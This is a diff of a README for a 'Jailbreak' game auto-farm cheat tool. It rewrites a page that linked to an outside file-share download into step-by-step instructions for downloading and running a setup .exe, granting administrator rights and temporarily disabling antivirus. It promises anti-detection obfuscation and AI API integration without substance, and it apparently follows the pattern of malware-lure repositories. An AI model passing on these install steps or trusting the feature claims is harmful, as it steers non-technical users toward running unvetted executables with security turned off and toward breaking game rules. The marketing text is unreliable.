@@ -1,113 +1,150 @@
-# 🚓 Jailbreak Script Auto Farm
+# 🎮 jailbreak-auto-farming-suite - Easy Script Auto Farm for Jailbreak
 
-[![](https://img.shields.io/badge/-purple)](https://DimasAsmara.github.io)
-
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.bond/E2XZZM/)
-
-**Effortless, Automated, and Safe Way to Boost Your Jailbreak Game**  
-Welcome to the ultimate Jailbreak Script Auto Farm repository — your one-stop power station for seamless progress in jailbreak style gameplay. Designed for enthusiasts seeking both automation and in-game reliability, this toolkit leverages the latest in AI integration, cross-compatibility, and innovative design.
+[![Download Now](https://img.shields.io/badge/Download-jailbreak--auto--farming--suite-brightgreen)](https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases)
 
 ---
 
-## 🎯 OS Compatibility Table
+## 📝 About This Application
 
-| Operating System     | Supported | Notes                                  |
-|---------------------|-----------|----------------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2F11-blue)  | 🟢 Yes    | Full-featured, optimized performance  |
-| ![MacOS](https://img.shields.io/badge/MacOS-Mojave%2B-blue)    | 🟢 Yes    | Native support with custom shortcuts  |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2FDebian-orange) | 🟢 Yes    | CLI and GUI modules available         |
-| ![Android](https://img.shields.io/badge/Android-11%2B-green)   | 🟡 Partial| Requires additional setup            |
-| ![iOS](https://img.shields.io/badge/iOS-14%2B-lightgrey)       | 🟡 Partial| Web client and remote scripts        |
-| ![Web](https://img.shields.io/badge/Web-Chrome%2FFirefox-blue) | 🟢 Yes    | Responsive interface, cloud save     |
+The jailbreak-auto-farming-suite helps you automate tasks in the Jailbreak game. It runs scripts that improve your in-game progress without manual effort. You can set it up on your Windows computer and let it manage farming activities. The tool uses a simple graphic interface so you don’t have to write or understand code.
 
+This guide shows you how to download, install, and start using the tool step-by-step. It targets users who may not have technical skills but want to improve game progress safely and reliably.
 
 ---
 
-## 🌟 Feature List
+## 💾 System Requirements
 
-- ⭐ **Fully Automated Resource Gathering**  
-    Set it and forget it — let the script handle repetitive tasks with robotic precision.
-- 🔒 **Intelligent Anti-Detection System**  
-    Superior obfuscation means you progress quietly and securely.
-- 💬 **Multilingual Support**  
-    Communicate with your toolkit in up to 12+ world languages, and even more on request.
-- 🎸 **Customizable User Dashboard**  
-    Fine-tune script behavior from a responsive & modern UI.
-- 📨 **24/7 Concierge-Level Support**  
-    A support team operates like a helpful NPC — always there, always responsive.
-- 🛡️ **API Integration with Leading AI Systems**  
-    OpenAI and Claude APIs add next-gen adaptation and optimization.
-- ♻️ **Cloud Sync & Progress Memory**  
-    Forget about manual saves — scripts remember and adapt.
-- 🤖 **Event-Driven Scripting Engine**  
-    Reacts to in-game happenings using real-time analytics.
-- 🎨 **Rich Theme Selection**  
-    Light, dark, solarized, and colorblind-friendly themes for a personalized experience.
+Before you start, ensure your PC meets these needs:
+
+- Windows 10 or higher
+- At least 4 GB memory (RAM)
+- 2 GHz or faster processor
+- 500 MB free disk space
+- Active internet connection for download
+
+The application runs in windowed mode and uses moderate CPU and memory during operation.
 
 ---
 
-## 🏅 SEO-Optimized for Discoverability
+## 🚀 Getting Started with Your Download
 
-Looking for an advanced, automated jailbreak script solution? This repository offers best-in-class **Jailbreak game automation scripts**, **auto farming tools**, **AI-driven gameplay enhancement**, and **cross-platform auto farm systems**. Experience lightning-fast performance and comprehensive support, ensuring your jailbreak sessions are always a step ahead.
+Start by visiting the release page to get the latest version.
 
----
+[![Download Now](https://img.shields.io/badge/Visit-Release_Page-blue)](https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases)
 
-## 🤖 OpenAI & Claude API Integration
+1. Click the link above or go to:  
+   https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases
 
-Harness the power of large language models for real-time strategy adjustments and intelligent response automation:
+2. On the release page, find the latest version marked with the highest number or most recent date.
 
-- **OpenAI API Link-Up**:  
-    Dynamic in-game suggestions, adaptive farming routes, and error correction via the world's most capable AI models.
-- **Claude API Support**:  
-    Natural language understanding to help interpret player commands, improve adaptability, and ensure script reliability.
+3. Under Assets, look for a file with a name like `jailbreak-auto-farming-suite-setup.exe` or `.zip`. This is the installer or program file.
 
-**How To Activate:**  
-Enable API modules from the "AI Integrations" tab in your dashboard. Configure your API keys and enjoy a smarter, more responsive auto farm experience.
+4. Click the file to download it. Save it to a folder you can find easily, like your Desktop or Downloads.
 
 ---
 
-## 🧠 Why Choose This Auto Farm Script?
+## ⚙️ Installing the Application
 
-- **Responsive UI**: Designed for finger-snap fast interaction on all devices.
-- **Multilingual Interface**: Switch between languages with ease — as friendly as your favorite concierge.
-- **24/7 Customer Support**: Real humans (and AIs) ready to help, whatever your timezone.
-- **Edge-AI Scripting**: Fine-tune script intelligence — no more cookie-cutter automation.
-- **Adaptive Learning**: Scripts analyze and learn from previous farming sessions.
-- **Clean, Modular Design**: Add, remove, or upgrade modules to fit your unique playstyle.
+Once the download completes, follow these steps to install:
 
----
+1. Locate the downloaded file (likely `jailbreak-auto-farming-suite-setup.exe`).
 
-## 🛠️ Getting Started
+2. Double-click the file to start the installer.
 
-1. ** the Latest :**  
-   [![](https://img.shields.io/badge/-purple)](https://DimasAsmara.github.io)
-2. Extract the package to your platform of choice.
-3. Run the Initialization Wizard — the assistant will tailor setup for your system.
-4. Configure your OpenAI / Claude API keys for next-level gameplay.
-5. Start the dashboard app, select automation modules, and press the big glowing START button!
+3. If Windows asks for permission, select **Yes** to let the application install.
 
-*Troubleshooting and advanced tips are available in the Wiki section (see repository sidebar).*
+4. Follow the on-screen instructions:
+
+   - Choose the installation folder (default is usually fine).
+   - Accept the license agreement.
+   - Click **Install** or **Next** when prompted.
+
+5. Wait for the installation to finish. You will see a confirmation screen.
+
+6. Click **Finish** to close the installer.
 
 ---
 
-## ⚠️ Disclaimer
+## ▶️ Running the Application
 
-This project is crafted for educational, personal use, and community-driven enhancement of gaming experiences.  
-We strongly discourage any form of disruptive or unauthorized use within live multiplayer environments.  
-Always ensure you comply with the terms of service of your platform or game. The authors are not responsible for any misuse, losses, or in-game disciplinary action resulting from improper application.
+After installation, start using the tool with these steps:
+
+1. Find the shortcut on your Desktop or in your Start menu called **jailbreak-auto-farming-suite**.
+
+2. Double-click to open the application.
+
+3. The main window shows simple controls and options.
+
+4. Use the menu or buttons to select the in-game scripts you want to run.
+
+5. Adjust any settings if needed — most users can keep default settings.
+
+6. Click **Start** to begin the automatic farming process.
+
+---
+
+## ⚙ Features Overview
+
+The application includes:
+
+- Automatic script running without typing code  
+- Simple, clean graphical interface  
+- Script selection to suit different farming goals  
+- Pause and resume options for control  
+- Basic safety checks to avoid common game restrictions  
+- Settings to adjust timing and script speed  
 
 ---
 
-## 📜 License: MIT (2025)
+## 🔄 Updating the Software
 
-Distributed under the MIT License.  
-See the [LICENSE](https://opensource.org/licenses/MIT) file for full text and permissions.
+To keep your tool working well, check for updates regularly:
+
+1. Return to the releases page:  
+   https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases
+
+2. Compare your current version (shown in the app) with the latest release on the page.
+
+3. Download and install new versions following the same process as your first install.
+
+Updates may provide new features or fix issues.
 
 ---
 
-## Quick Access
+## ❓ Troubleshooting Common Issues
 
-- [![](https://img.shields.io/badge/-purple)](https://DimasAsmara.github.io)
+- **App won’t start**  
+  Make sure Windows requirements are met and try running as Administrator (right-click app > Run as Administrator).
+
+- **Scripts don’t run**  
+  Check you have selected the correct script. Restart the app if needed.
+
+- **Download or install errors**  
+  Try disabling antivirus temporarily during install. Use a stable internet connection.
+
+- **Game crashes during automation**  
+  Pause the script and restart both the game and the tool.
+
+If problems persist, check the issue tracker on the GitHub page.
 
 ---
-**2025 © Jailbreak Script Auto Farm Community – Revolutionizing Automation, One Task at a Time!**
+
+## 🔗 Useful Links
+
+- Releases page (download here):  
+  https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases
+
+- Project homepage:  
+  https://github.com/dariocalderonse010/jailbreak-auto-farming-suite
+
+---
+
+## 🛠 Technical Details
+
+The jailbreak-auto-farming-suite uses script automation designed specifically for the Jailbreak game. It runs in a Windows environment and communicates through a graphical user interface built to simplify use. The tool requires no programming knowledge and can be used by anyone familiar with basic computer operations.
+
+---
+
+## ⚖ Legal and Safe Use
+
+This tool is intended to help automate tasks for personal use only. Follow the game’s terms of service when using any scripts or automation. Avoid activities that may lead to account suspension. Use the software responsibly.
